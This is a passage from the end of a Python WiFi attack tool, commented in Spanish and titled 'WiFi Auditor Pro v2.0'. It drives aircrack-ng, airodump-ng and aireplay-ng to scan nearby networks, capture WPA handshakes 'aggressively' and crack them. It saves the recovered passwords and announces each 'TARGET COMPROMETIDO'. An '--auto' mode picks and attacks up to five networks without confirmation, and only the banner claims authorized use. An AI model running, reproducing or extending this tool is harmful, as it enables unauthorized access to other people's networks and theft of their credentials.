                    return password
            
        except Exception as e:
            self.log(f"Error en lote progresivo {batch_name}: {e}", "WARNING")
        finally:
            # Limpiar archivo temporal
            try:
                os.remove(temp_file)
            except:
                pass
        
        return None

    def _save_original_state(self):
        """Guardar estado original del sistema"""
        try:
            success, output, _ = self.run_command("systemctl is-active NetworkManager", capture_output=True)
            self.original_nm_state = "active" if success and "active" in output else "inactive"
            
            success, output, _ = self.run_command("iw dev 2>/dev/null || iwconfig 2>/dev/null || ip link show", capture_output=True)
            if success:
                self.original_interfaces = output
            else:
                self.original_interfaces = ""
        except Exception as e:
            self.log(f"Error guardando estado original: {e}", "WARNING")

    def cleanup(self):
        """Limpieza del sistema"""
        self.log("Limpiando sistema...", "INFO")
        self.running = False
        
        # Matar procesos
        subprocess.run("pkill -f airodump-ng", shell=True, stderr=subprocess.DEVNULL)
        subprocess.run("pkill -f aireplay-ng", shell=True, stderr=subprocess.DEVNULL)
        subprocess.run("pkill -f aircrack-ng", shell=True, stderr=subprocess.DEVNULL)
        
        # Restaurar interfaz
        if self.monitor_interface:
            subprocess.run(f"airmon-ng stop {self.monitor_interface}", shell=True, stdout=subprocess.DEVNULL)
        
        self.log("Limpieza completada", "SUCCESS")

    def save_results(self):
        """Guardar resultados de la auditoría"""
        if self.cracked_networks:
            results = {
                'session': datetime.now().isoformat(),
                'networks': self.cracked_networks
            }
            
            result_file = f"audit_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(result_file, 'w') as f:
                json.dump(results, f, indent=4)
            
            self.log(f"Resultados guardados en: {result_file}", "SUCCESS")

    def run_audit(self):
        """Ejecutar auditoría completa"""
        self.log("Iniciando WiFi Auditor Pro v2.0 - Simplificado", "INFO")
        
        # Verificaciones iniciales
        self.check_root()
        if not self.check_dependencies():
            return False
        
        # Configurar interfaz
        if not self.select_interface():
            return False
        
        if not self.enable_monitor_mode():
            return False
        
        try:
            # Escanear redes
            if not self.scan_networks():
                return False
            
            # Seleccionar objetivos
            auto_mode = self.config.get('auto_target_selection', False)
            selected_targets = self.select_targets(auto_mode=auto_mode)
            if not selected_targets:
                self.log("No se seleccionaron objetivos", "WARNING")
                return False
            
            self.targets = selected_targets
            
            # Auditar cada objetivo
            for i, target in enumerate(self.targets, 1):
                if not self.running:
                    break
                
                self.log(f"Auditando objetivo {i}/{len(self.targets)}: {target['essid']}", "INFO")
                
                # Capturar handshake
                handshake_file = self.aggressive_handshake_capture(target)
                
                # Crackear si se configuró
                auto_crack = self.config.get('auto_crack', True)
                if handshake_file and auto_crack:
                    password = self.crack_handshake(target, handshake_file)
                    if password:
                        self.log(f"\n💪 TARGET COMPROMETIDO: {target['essid']} -> {password} 💪\n", "SUCCESS")
        
        finally:
            # Guardar resultados y limpiar
            self.save_results()
            self.cleanup()
        
        return True

def main():
    parser = argparse.ArgumentParser(description='WiFi Auditor Pro v2.0 - Simplificado')
    parser.add_argument('-i', '--interface', help='Interfaz WiFi a usar')
    parser.add_argument('-t', '--time', type=int, default=30, help='Tiempo de escaneo en segundos')
    parser.add_argument('--no-crack', action='store_true', help='Solo capturar handshakes, no crackear')
    parser.add_argument('-v', '--verbose', action='store_true', help='Modo verboso')
    parser.add_argument('--auto', action='store_true', help='Modo completamente automático')
    parser.add_argument('--max-targets', type=int, default=5, help='Máximo número de objetivos automáticos')
    
    args = parser.parse_args()
    
    # Banner
    print(f"""
{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════╗
║     WiFi Auditor Pro v2.0            ║
║     Versión Simplificada             ║
╚══════════════════════════════════════╝
{Colors.END}
{Colors.GREEN}Auditoría de seguridad WiFi profesional{Colors.END}
{Colors.YELLOW}Uso exclusivo para evaluación autorizada{Colors.END}
""")
    
    auditor = WiFiAuditor()
    
    # Aplicar argumentos
    if args.interface:
        auditor.interface = args.interface
    
    if args.time:
        auditor.config['scan_time'] = args.time
    
    if args.no_crack:
        auditor.config['auto_crack'] = False
    
    if args.verbose:
        auditor.config['verbose'] = True
    
    # Configuraciones para modo automático
    if args.auto:
        auditor.config['auto_target_selection'] = True
        auditor.config['auto_crack'] = True
        auditor.config['verbose'] = True
        auditor.log("=== MODO AUTOMÁTICO ACTIVADO ===", "SUCCESS")
    
    if args.max_targets:
        auditor.config['max_auto_targets'] = args.max_targets
    
    # Ejecutar auditoría
    try:
        auditor.run_audit()
    except KeyboardInterrupt:
        auditor.log("Auditoría interrumpida por el usuario", "WARNING")
    except Exception as e:
        auditor.log(f"Error inesperado: {e}", "ERROR")
    finally:
        auditor.cleanup()

if __name__ == "__main__":
    main()
